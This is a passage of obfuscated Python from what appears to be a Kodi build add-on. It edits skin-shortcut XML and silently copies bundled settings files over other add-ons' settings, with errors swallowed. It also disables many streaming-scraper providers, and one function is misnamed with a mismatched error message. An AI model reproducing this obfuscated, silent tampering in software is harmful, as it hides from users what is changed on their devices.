		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1200
    with open (O0O00OOOO0O00O00O ,'w')as OO000O000OO0OO00O :#line:1203
      OO000O000OO0OO00O .write (O0OOOO00OOOO00O00 )#line:1204
    O0O00OOOO0O00O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1208
    with open (O0O00OOOO0O00O00O ,'r')as OO000O000OO0OO00O :#line:1209
      O0OOOO00OOOO00O00 =OO000O000OO0OO00O .read ()#line:1210
    O0OOOO00OOOO00O00 =O0OOOO00OOOO00O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1228
    with open (O0O00OOOO0O00O00O ,'w')as OO000O000OO0OO00O :#line:1231
      OO000O000OO0OO00O .write (O0OOOO00OOOO00O00 )#line:1232
    O0O00OOOO0O00O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1236
    with open (O0O00OOOO0O00O00O ,'r')as OO000O000OO0OO00O :#line:1237
      O0OOOO00OOOO00O00 =OO000O000OO0OO00O .read ()#line:1238
    O0OOOO00OOOO00O00 =O0OOOO00OOOO00O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1256
    with open (O0O00OOOO0O00O00O ,'w')as OO000O000OO0OO00O :#line:1259
      OO000O000OO0OO00O .write (O0OOOO00OOOO00O00 )#line:1260
    O0O00OOOO0O00O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1264
    with open (O0O00OOOO0O00O00O ,'r')as OO000O000OO0OO00O :#line:1265
      O0OOOO00OOOO00O00 =OO000O000OO0OO00O .read ()#line:1266
    O0OOOO00OOOO00O00 =O0OOOO00OOOO00O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1284
    with open (O0O00OOOO0O00O00O ,'w')as OO000O000OO0OO00O :#line:1287
      OO000O000OO0OO00O .write (O0OOOO00OOOO00O00 )#line:1288
    O0O00OOOO0O00O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1291
    with open (O0O00OOOO0O00O00O ,'r')as OO000O000OO0OO00O :#line:1292
      O0OOOO00OOOO00O00 =OO000O000OO0OO00O .read ()#line:1293
    O0OOOO00OOOO00O00 =O0OOOO00OOOO00O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1311
    with open (O0O00OOOO0O00O00O ,'w')as OO000O000OO0OO00O :#line:1314
      OO000O000OO0OO00O .write (O0OOOO00OOOO00O00 )#line:1315
    O0O00OOOO0O00O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1317
    with open (O0O00OOOO0O00O00O ,'r')as OO000O000OO0OO00O :#line:1318
      O0OOOO00OOOO00O00 =OO000O000OO0OO00O .read ()#line:1319
    O0OOOO00OOOO00O00 =O0OOOO00OOOO00O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1337
    with open (O0O00OOOO0O00O00O ,'w')as OO000O000OO0OO00O :#line:1340
      OO000O000OO0OO00O .write (O0OOOO00OOOO00O00 )#line:1341
    O0O00OOOO0O00O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1343
    with open (O0O00OOOO0O00O00O ,'r')as OO000O000OO0OO00O :#line:1344
      O0OOOO00OOOO00O00 =OO000O000OO0OO00O .read ()#line:1345
    O0OOOO00OOOO00O00 =O0OOOO00OOOO00O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1363
    with open (O0O00OOOO0O00O00O ,'w')as OO000O000OO0OO00O :#line:1366
      OO000O000OO0OO00O .write (O0OOOO00OOOO00O00 )#line:1367
    O0O00OOOO0O00O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1370
    with open (O0O00OOOO0O00O00O ,'r')as OO000O000OO0OO00O :#line:1371
      O0OOOO00OOOO00O00 =OO000O000OO0OO00O .read ()#line:1372
    O0OOOO00OOOO00O00 =O0OOOO00OOOO00O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1390
    with open (O0O00OOOO0O00O00O ,'w')as OO000O000OO0OO00O :#line:1393
      OO000O000OO0OO00O .write (O0OOOO00OOOO00O00 )#line:1394
def rdbuildinstallON ():#line:1397
    try :#line:1399
       O0000O000000O0O00 =ADDONPATH +"/resources/rd/victory.xml"#line:1400
       OO0O00OO0O00O0O0O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1401
       copyfile (O0000O000000O0O00 ,OO0O00OO0O00O0O0O )#line:1403
       O0000O000000O0O00 =ADDONPATH +"/resources/rd/exodusredux.xml"#line:1405
       OO0O00OO0O00O0O0O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1406
       copyfile (O0000O000000O0O00 ,OO0O00OO0O00O0O0O )#line:1408
       O0000O000000O0O00 =ADDONPATH +"/resources/rd/openscrapers.xml"#line:1410
       OO0O00OO0O00O0O0O =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1411
       copyfile (O0000O000000O0O00 ,OO0O00OO0O00O0O0O )#line:1413
       O0000O000000O0O00 =ADDONPATH +"/resources/rd/Splash.png"#line:1416
       OO0O00OO0O00O0O0O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1417
       copyfile (O0000O000000O0O00 ,OO0O00OO0O00O0O0O )#line:1419
    except :#line:1421
       pass #line:1422
def rdbuild ():#line:1432
	O000OO000OO00O0O0 =(ADDON .getSetting ("auto_rd"))#line:1433
	if O000OO000OO00O0O0 =='true':#line:1434
		O0OO00O0O00O0000O =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:1435
		O0OO00O0O00O0000O .setSetting ('all_t','0')#line:1436
		O0OO00O0O00O0000O .setSetting ('rd_menu_enable','false')#line:1437
		O0OO00O0O00O0000O .setSetting ('magnet_bay','false')#line:1438
		O0OO00O0O00O0000O .setSetting ('magnet_extra','false')#line:1439
		O0OO00O0O00O0000O .setSetting ('rd_only','false')#line:1440
		O0OO00O0O00O0000O .setSetting ('ftp','false')#line:1442
		O0OO00O0O00O0000O .setSetting ('fp','false')#line:1443
		O0OO00O0O00O0000O .setSetting ('filter_fp','false')#line:1444
		O0OO00O0O00O0000O .setSetting ('fp_size_en','false')#line:1445
		O0OO00O0O00O0000O .setSetting ('afdah','false')#line:1446
		O0OO00O0O00O0000O .setSetting ('ap2s','false')#line:1447
		O0OO00O0O00O0000O .setSetting ('cin','false')#line:1448
		O0OO00O0O00O0000O .setSetting ('clv','false')#line:1449
		O0OO00O0O00O0000O .setSetting ('cmv','false')#line:1450
		O0OO00O0O00O0000O .setSetting ('dl20','false')#line:1451
		O0OO00O0O00O0000O .setSetting ('esc','false')#line:1452
		O0OO00O0O00O0000O .setSetting ('extra','false')#line:1453
		O0OO00O0O00O0000O .setSetting ('film','false')#line:1454
		O0OO00O0O00O0000O .setSetting ('fre','false')#line:1455
		O0OO00O0O00O0000O .setSetting ('fxy','false')#line:1456
		O0OO00O0O00O0000O .setSetting ('genv','false')#line:1457
		O0OO00O0O00O0000O .setSetting ('getgo','false')#line:1458
		O0OO00O0O00O0000O .setSetting ('gold','false')#line:1459
		O0OO00O0O00O0000O .setSetting ('gona','false')#line:1460
		O0OO00O0O00O0000O .setSetting ('hdmm','false')#line:1461
		O0OO00O0O00O0000O .setSetting ('hdt','false')#line:1462
		O0OO00O0O00O0000O .setSetting ('icy','false')#line:1463
		O0OO00O0O00O0000O .setSetting ('ind','false')#line:1464
		O0OO00O0O00O0000O .setSetting ('iwi','false')#line:1465
		O0OO00O0O00O0000O .setSetting ('jen_free','false')#line:1466
		O0OO00O0O00O0000O .setSetting ('kiss','false')#line:1467
		O0OO00O0O00O0000O .setSetting ('lavin','false')#line:1468
		O0OO00O0O00O0000O .setSetting ('los','false')#line:1469
		O0OO00O0O00O0000O .setSetting ('m4u','false')#line:1470
		O0OO00O0O00O0000O .setSetting ('mesh','false')#line:1471
		O0OO00O0O00O0000O .setSetting ('mf','false')#line:1472
		O0OO00O0O00O0000O .setSetting ('mkvc','false')#line:1473
		O0OO00O0O00O0000O .setSetting ('mjy','false')#line:1474
		O0OO00O0O00O0000O .setSetting ('hdonline','false')#line:1475
		O0OO00O0O00O0000O .setSetting ('moviex','false')#line:1476
		O0OO00O0O00O0000O .setSetting ('mpr','false')#line:1477
		O0OO00O0O00O0000O .setSetting ('mvg','false')#line:1478
		O0OO00O0O00O0000O .setSetting ('mvl','false')#line:1479
		O0OO00O0O00O0000O .setSetting ('mvs','false')#line:1480
		O0OO00O0O00O0000O .setSetting ('myeg','false')#line:1481
		O0OO00O0O00O0000O .setSetting ('ninja','false')#line:1482
		O0OO00O0O00O0000O .setSetting ('odb','false')#line:1483
		O0OO00O0O00O0000O .setSetting ('ophd','false')#line:1484
		O0OO00O0O00O0000O .setSetting ('pks','false')#line:1485
		O0OO00O0O00O0000O .setSetting ('prf','false')#line:1486
		O0OO00O0O00O0000O .setSetting ('put18','false')#line:1487
		O0OO00O0O00O0000O .setSetting ('req','false')#line:1488
		O0OO00O0O00O0000O .setSetting ('rftv','false')#line:1489
		O0OO00O0O00O0000O .setSetting ('rltv','false')#line:1490
		O0OO00O0O00O0000O .setSetting ('sc','false')#line:1491
		O0OO00O0O00O0000O .setSetting ('seehd','false')#line:1492
		O0OO00O0O00O0000O .setSetting ('showbox','false')#line:1493
		O0OO00O0O00O0000O .setSetting ('shuid','false')#line:1494
		O0OO00O0O00O0000O .setSetting ('sil_gh','false')#line:1495
		O0OO00O0O00O0000O .setSetting ('spv','false')#line:1496
		O0OO00O0O00O0000O .setSetting ('subs','false')#line:1497
		O0OO00O0O00O0000O .setSetting ('tvs','false')#line:1498
		O0OO00O0O00O0000O .setSetting ('tw','false')#line:1499
		O0OO00O0O00O0000O .setSetting ('upto','false')#line:1500
		O0OO00O0O00O0000O .setSetting ('vel','false')#line:1501
		O0OO00O0O00O0000O .setSetting ('vex','false')#line:1502
		O0OO00O0O00O0000O .setSetting ('vidc','false')#line:1503
		O0OO00O0O00O0000O .setSetting ('w4hd','false')#line:1504
		O0OO00O0O00O0000O .setSetting ('wav','false')#line:1505
		O0OO00O0O00O0000O .setSetting ('wf','false')#line:1506
		O0OO00O0O00O0000O .setSetting ('wse','false')#line:1507
		O0OO00O0O00O0000O .setSetting ('wss','false')#line:1508
		O0OO00O0O00O0000O .setSetting ('wsse','false')#line:1509
		O0OO00O0O00O0000O =xbmcaddon .Addon ('plugin.video.speedmax')#line:1510
		O0OO00O0O00O0000O .setSetting ('debrid.only','true')#line:1511
		O0OO00O0O00O0000O .setSetting ('hosts.captcha','false')#line:1512
		O0OO00O0O00O0000O =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1513
		O0OO00O0O00O0000O .setSetting ('provider.123moviehd','false')#line:1514
		O0OO00O0O00O0000O .setSetting ('provider.300mbdownload','false')#line:1515
		O0OO00O0O00O0000O .setSetting ('provider.alltube','false')#line:1516
		O0OO00O0O00O0000O .setSetting ('provider.allucde','false')#line:1517
		O0OO00O0O00O0000O .setSetting ('provider.animebase','false')#line:1518
		O0OO00O0O00O0000O .setSetting ('provider.animeloads','false')#line:1519
		O0OO00O0O00O0000O .setSetting ('provider.animetoon','false')#line:1520
		O0OO00O0O00O0000O .setSetting ('provider.bnwmovies','false')#line:1521
		O0OO00O0O00O0000O .setSetting ('provider.boxfilm','false')#line:1522
		O0OO00O0O00O0000O .setSetting ('provider.bs','false')#line:1523
		O0OO00O0O00O0000O .setSetting ('provider.cartoonhd','false')#line:1524
		O0OO00O0O00O0000O .setSetting ('provider.cdahd','false')#line:1525
		O0OO00O0O00O0000O .setSetting ('provider.cdax','false')#line:1526
		O0OO00O0O00O0000O .setSetting ('provider.cine','false')#line:1527
		O0OO00O0O00O0000O .setSetting ('provider.cinenator','false')#line:1528
		O0OO00O0O00O0000O .setSetting ('provider.cmovieshdbz','false')#line:1529
		O0OO00O0O00O0000O .setSetting ('provider.coolmoviezone','false')#line:1530
		O0OO00O0O00O0000O .setSetting ('provider.ddl','false')#line:1531
		O0OO00O0O00O0000O .setSetting ('provider.deepmovie','false')#line:1532
		O0OO00O0O00O0000O .setSetting ('provider.ekinomaniak','false')#line:1533
		O0OO00O0O00O0000O .setSetting ('provider.ekinotv','false')#line:1534
		O0OO00O0O00O0000O .setSetting ('provider.filiser','false')#line:1535
		O0OO00O0O00O0000O .setSetting ('provider.filmpalast','false')#line:1536
		O0OO00O0O00O0000O .setSetting ('provider.filmwebbooster','false')#line:1537
		O0OO00O0O00O0000O .setSetting ('provider.filmxy','false')#line:1538
		O0OO00O0O00O0000O .setSetting ('provider.fmovies','false')#line:1539
		O0OO00O0O00O0000O .setSetting ('provider.foxx','false')#line:1540
		O0OO00O0O00O0000O .setSetting ('provider.freefmovies','false')#line:1541
		O0OO00O0O00O0000O .setSetting ('provider.freeputlocker','false')#line:1542
		O0OO00O0O00O0000O .setSetting ('provider.furk','false')#line:1543
		O0OO00O0O00O0000O .setSetting ('provider.gamatotv','false')#line:1544
		O0OO00O0O00O0000O .setSetting ('provider.gogoanime','false')#line:1545
		O0OO00O0O00O0000O .setSetting ('provider.gowatchseries','false')#line:1546
		O0OO00O0O00O0000O .setSetting ('provider.hackimdb','false')#line:1547
		O0OO00O0O00O0000O .setSetting ('provider.hdfilme','false')#line:1548
		O0OO00O0O00O0000O .setSetting ('provider.hdmto','false')#line:1549
		O0OO00O0O00O0000O .setSetting ('provider.hdpopcorns','false')#line:1550
		O0OO00O0O00O0000O .setSetting ('provider.hdstreams','false')#line:1551
		O0OO00O0O00O0000O .setSetting ('provider.horrorkino','false')#line:1553
		O0OO00O0O00O0000O .setSetting ('provider.iitv','false')#line:1554
		O0OO00O0O00O0000O .setSetting ('provider.iload','false')#line:1555
		O0OO00O0O00O0000O .setSetting ('provider.iwaatch','false')#line:1556
		O0OO00O0O00O0000O .setSetting ('provider.kinodogs','false')#line:1557
		O0OO00O0O00O0000O .setSetting ('provider.kinoking','false')#line:1558
		O0OO00O0O00O0000O .setSetting ('provider.kinow','false')#line:1559
		O0OO00O0O00O0000O .setSetting ('provider.kinox','false')#line:1560
		O0OO00O0O00O0000O .setSetting ('provider.lichtspielhaus','false')#line:1561
		O0OO00O0O00O0000O .setSetting ('provider.liomenoi','false')#line:1562
		O0OO00O0O00O0000O .setSetting ('provider.magnetdl','false')#line:1565
		O0OO00O0O00O0000O .setSetting ('provider.megapelistv','false')#line:1566
		O0OO00O0O00O0000O .setSetting ('provider.movie2k-ac','false')#line:1567
		O0OO00O0O00O0000O .setSetting ('provider.movie2k-ag','false')#line:1568
		O0OO00O0O00O0000O .setSetting ('provider.movie2z','false')#line:1569
		O0OO00O0O00O0000O .setSetting ('provider.movie4k','false')#line:1570
		O0OO00O0O00O0000O .setSetting ('provider.movie4kis','false')#line:1571
		O0OO00O0O00O0000O .setSetting ('provider.movieneo','false')#line:1572
		O0OO00O0O00O0000O .setSetting ('provider.moviesever','false')#line:1573
		O0OO00O0O00O0000O .setSetting ('provider.movietown','false')#line:1574
		O0OO00O0O00O0000O .setSetting ('provider.mvrls','false')#line:1576
		O0OO00O0O00O0000O .setSetting ('provider.netzkino','false')#line:1577
		O0OO00O0O00O0000O .setSetting ('provider.odb','false')#line:1578
		O0OO00O0O00O0000O .setSetting ('provider.openkatalog','false')#line:1579
		O0OO00O0O00O0000O .setSetting ('provider.ororo','false')#line:1580
		O0OO00O0O00O0000O .setSetting ('provider.paczamy','false')#line:1581
		O0OO00O0O00O0000O .setSetting ('provider.peliculasdk','false')#line:1582
		O0OO00O0O00O0000O .setSetting ('provider.pelisplustv','false')#line:1583
		O0OO00O0O00O0000O .setSetting ('provider.pepecine','false')#line:1584
		O0OO00O0O00O0000O .setSetting ('provider.primewire','false')#line:1585
		O0OO00O0O00O0000O .setSetting ('provider.projectfreetv','false')#line:1586
		O0OO00O0O00O0000O .setSetting ('provider.proxer','false')#line:1587
		O0OO00O0O00O0000O .setSetting ('provider.pureanime','false')#line:1588
		O0OO00O0O00O0000O .setSetting ('provider.putlocker','false')#line:1589
		O0OO00O0O00O0000O .setSetting ('provider.putlockerfree','false')#line:1590
		O0OO00O0O00O0000O .setSetting ('provider.reddit','false')#line:1591
		O0OO00O0O00O0000O .setSetting ('provider.cartoonwire','false')#line:1592
		O0OO00O0O00O0000O .setSetting ('provider.seehd','false')#line:1593
		O0OO00O0O00O0000O .setSetting ('provider.segos','false')#line:1594
		O0OO00O0O00O0000O .setSetting ('provider.serienstream','false')#line:1595
		O0OO00O0O00O0000O .setSetting ('provider.series9','false')#line:1596
		O0OO00O0O00O0000O .setSetting ('provider.seriesever','false')#line:1597
		O0OO00O0O00O0000O .setSetting ('provider.seriesonline','false')#line:1598
		O0OO00O0O00O0000O .setSetting ('provider.seriespapaya','false')#line:1599
		O0OO00O0O00O0000O .setSetting ('provider.sezonlukdizi','false')#line:1600
		O0OO00O0O00O0000O .setSetting ('provider.solarmovie','false')#line:1601
		O0OO00O0O00O0000O .setSetting ('provider.solarmoviez','false')#line:1602
		O0OO00O0O00O0000O .setSetting ('provider.stream-to','false')#line:1603
		O0OO00O0O00O0000O .setSetting ('provider.streamdream','false')#line:1604
		O0OO00O0O00O0000O .setSetting ('provider.streamflix','false')#line:1605
		O0OO00O0O00O0000O .setSetting ('provider.streamit','false')#line:1606
		O0OO00O0O00O0000O .setSetting ('provider.swatchseries','false')#line:1607
		O0OO00O0O00O0000O .setSetting ('provider.szukajkatv','false')#line:1608
		O0OO00O0O00O0000O .setSetting ('provider.tainiesonline','false')#line:1609
		O0OO00O0O00O0000O .setSetting ('provider.tainiomania','false')#line:1610
		O0OO00O0O00O0000O .setSetting ('provider.tata','false')#line:1613
		O0OO00O0O00O0000O .setSetting ('provider.trt','false')#line:1614
		O0OO00O0O00O0000O .setSetting ('provider.tvbox','false')#line:1615
		O0OO00O0O00O0000O .setSetting ('provider.ultrahd','false')#line:1616
		O0OO00O0O00O0000O .setSetting ('provider.video4k','false')#line:1617
		O0OO00O0O00O0000O .setSetting ('provider.vidics','false')#line:1618
		O0OO00O0O00O0000O .setSetting ('provider.view4u','false')#line:1619
		O0OO00O0O00O0000O .setSetting ('provider.watchseries','false')#line:1620
		O0OO00O0O00O0000O .setSetting ('provider.xrysoi','false')#line:1621
		O0OO00O0O00O0000O .setSetting ('provider.library','false')#line:1622
def fixfont ():#line:1625
	O00O0O00O0OOOO00O =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:1626
	OO0OO00O00O00OOO0 =json .loads (O00O0O00O0OOOO00O );#line:1628
	O0OO00O0OOOO0OOOO =OO0OO00O00O00OOO0 ["result"]["settings"]#line:1629
	O000O0O000O0O0O0O =[O0000OO0OO00O0O00 for O0000OO0OO00O0O00 in O0OO00O0OOOO0OOOO if O0000OO0OO00O0O00 ["id"]=="audiooutput.audiodevice"][0 ]#line:1631
	O00O00OO00O0O0O00 =O000O0O000O0O0O0O ["options"];#line:1632
	O0O00OOOO00O0000O =O000O0O000O0O0O0O ["value"];#line:1633
	O0OOOOO000000O000 =[O0O0000OOO0O0O0O0 for (O0O0000OOO0O0O0O0 ,O000O00OO0O0O0O0O )in enumerate (O00O00OO00O0O0O00 )if O000O00OO0O0O0O0O ["value"]==O0O00OOOO00O0000O ][0 ];#line:1635
	OOOOO0OOO00O0O000 =(O0OOOOO000000O000 +1 )%len (O00O00OO00O0O0O00 )#line:1637
	OO00OO00OO0OOO0O0 =O00O00OO00O0O0O00 [OOOOO0OOO00O0O000 ]["value"]#line:1639
	O0OO0O0OO0000OOO0 =O00O00OO00O0O0O00 [OOOOO0OOO00O0O000 ]["label"]#line:1640
	O00O0O0OOO00O0OOO =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:1642
	try :#line:1644
		O0OOO0000O00O00O0 =json .loads (O00O0O0OOO00O0OOO );#line:1645
		if O0OOO0000O00O00O0 ["result"]!=True :#line:1647
			raise Exception #line:1648
	except :#line:1649
		sys .stderr .write ("Error switching audio output device")#line:1650
		raise Exception #line:1651
def parseDOM2 (O000O00O000O00O00 ,name =u"",attrs ={},ret =False ):#line:1652
	if isinstance (O000O00O000O00O00 ,str ):#line:1655
		try :#line:1656
			O000O00O000O00O00 =[O000O00O000O00O00 .decode ("utf-8")]#line:1657
		except :#line:1658
			O000O00O000O00O00 =[O000O00O000O00O00 ]#line:1659
	elif isinstance (O000O00O000O00O00 ,unicode ):#line:1660
		O000O00O000O00O00 =[O000O00O000O00O00 ]#line:1661
	elif not isinstance (O000O00O000O00O00 ,list ):#line:1662
		return u""#line:1663
	if not name .strip ():#line:1665
		return u""#line:1666
	O0O0OO00000O00O0O =[]#line:1668
	for O0O00O00OO0O0OO0O in O000O00O000O00O00 :#line:1669
		OO000OO0OOO0O0000 =re .compile ('(<[^>]*?\n[^>]*?>)').findall (O0O00O00OO0O0OO0O )#line:1670
		for O0000O0O0000OOOO0 in OO000OO0OOO0O0000 :#line:1671
			O0O00O00OO0O0OO0O =O0O00O00OO0O0OO0O .replace (O0000O0O0000OOOO0 ,O0000O0O0000OOOO0 .replace ("\n"," "))#line:1672
		O0OO00OOO0000O0OO =[]#line:1674
		for O0O00O00OOOO00O0O in attrs :#line:1675
			O00OOO00OO00000O0 =re .compile ('(<'+name +'[^>]*?(?:'+O0O00O00OOOO00O0O +'=[\'"]'+attrs [O0O00O00OOOO00O0O ]+'[\'"].*?>))',re .M |re .S ).findall (O0O00O00OO0O0OO0O )#line:1676
			if len (O00OOO00OO00000O0 )==0 and attrs [O0O00O00OOOO00O0O ].find (" ")==-1 :#line:1677
				O00OOO00OO00000O0 =re .compile ('(<'+name +'[^>]*?(?:'+O0O00O00OOOO00O0O +'='+attrs [O0O00O00OOOO00O0O ]+'.*?>))',re .M |re .S ).findall (O0O00O00OO0O0OO0O )#line:1678
			if len (O0OO00OOO0000O0OO )==0 :#line:1680
				O0OO00OOO0000O0OO =O00OOO00OO00000O0 #line:1681
				O00OOO00OO00000O0 =[]#line:1682
			else :#line:1683
				OO0OOOOOOO0O0000O =range (len (O0OO00OOO0000O0OO ))#line:1684
				OO0OOOOOOO0O0000O .reverse ()#line:1685
				for OOOOOOO0O0O000O0O in OO0OOOOOOO0O0000O :#line:1686
					if not O0OO00OOO0000O0OO [OOOOOOO0O0O000O0O ]in O00OOO00OO00000O0 :#line:1687
						del (O0OO00OOO0000O0OO [OOOOOOO0O0O000O0O ])#line:1688
		if len (O0OO00OOO0000O0OO )==0 and attrs =={}:#line:1690
			O0OO00OOO0000O0OO =re .compile ('(<'+name +'>)',re .M |re .S ).findall (O0O00O00OO0O0OO0O )#line:1691
			if len (O0OO00OOO0000O0OO )==0 :#line:1692
				O0OO00OOO0000O0OO =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (O0O00O00OO0O0OO0O )#line:1693
		if isinstance (ret ,str ):#line:1695
			O00OOO00OO00000O0 =[]#line:1696
			for O0000O0O0000OOOO0 in O0OO00OOO0000O0OO :#line:1697
				O0OO0OO000O0OOOO0 =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (O0000O0O0000OOOO0 )#line:1698
				if len (O0OO0OO000O0OOOO0 )==0 :#line:1699
					O0OO0OO000O0OOOO0 =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (O0000O0O0000OOOO0 )#line:1700
				for OOOO0OOO0000OOO00 in O0OO0OO000O0OOOO0 :#line:1701
					OOOOO0OOO0OOO000O =OOOO0OOO0000OOO00 [0 ]#line:1702
					if OOOOO0OOO0OOO000O in "'\"":#line:1703
						if OOOO0OOO0000OOO00 .find ('='+OOOOO0OOO0OOO000O ,OOOO0OOO0000OOO00 .find (OOOOO0OOO0OOO000O ,1 ))>-1 :#line:1704
							OOOO0OOO0000OOO00 =OOOO0OOO0000OOO00 [:OOOO0OOO0000OOO00 .find ('='+OOOOO0OOO0OOO000O ,OOOO0OOO0000OOO00 .find (OOOOO0OOO0OOO000O ,1 ))]#line:1705
						if OOOO0OOO0000OOO00 .rfind (OOOOO0OOO0OOO000O ,1 )>-1 :#line:1707
